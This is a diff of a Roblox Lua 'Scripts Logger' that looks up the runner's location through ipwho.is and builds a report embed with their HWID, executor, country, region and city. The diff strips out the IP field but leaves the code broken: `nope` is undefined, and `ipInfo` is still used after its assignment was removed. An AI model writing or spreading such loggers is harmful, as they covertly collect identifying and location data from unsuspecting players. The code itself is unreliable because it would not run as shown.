@@ -3,7 +3,6 @@ local HttpService = game:GetService("HttpService")
 function GetIPInfo()
     local api = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
     return {
-        ip = api.ip or "Unknown IP",
         country = api.country or "Unknown Country",
         countryCode = api.country_code or "N/A",
         flagEmoji = api.flag.emoji or "",
@@ -96,8 +95,6 @@ local serverPlayers = #game.Players:GetPlayers() .. " / " .. game.Players.MaxPla
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
 
-local ipInfo = GetIPInfo()
-
 local embeds = {
     {
         ["title"] = "Scripts Logger",
@@ -116,7 +113,7 @@ local embeds = {
             "**Platform:** " .. platform .. "\n" ..
             "**Ping:** " .. ping .. "ms\n" ..
             "**HWID:** `" .. hwid .. "`\n" ..
-            "**IP:** `" .. ipInfo.ip .. "`\n" ..
+            "**IP:** `" .. nope .. "`\n" ..
             "**Country:** " .. ipInfo.flagEmoji .. " " .. ipInfo.country .. " (" .. ipInfo.countryCode .. ")\n" ..
             "**Region:** " .. ipInfo.region .. "\n" ..
             "**City:** " .. ipInfo.city .. "\n" ..
